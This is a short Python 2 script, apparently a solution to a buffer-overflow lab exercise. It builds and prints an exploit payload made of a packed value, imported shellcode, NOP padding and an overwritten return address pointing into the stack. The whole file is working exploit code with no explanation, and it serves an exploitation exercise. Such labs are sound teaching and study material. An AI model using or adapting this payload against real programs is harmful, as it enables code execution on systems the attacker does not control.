#!/usr/bin/env python2

from shellcode import shellcode
from struct import pack

# Padding goes here
p = pack('<I', 0x40000000)+ shellcode +"\x90"*37 + "\x60\xe7\xfe\xbf"

print p
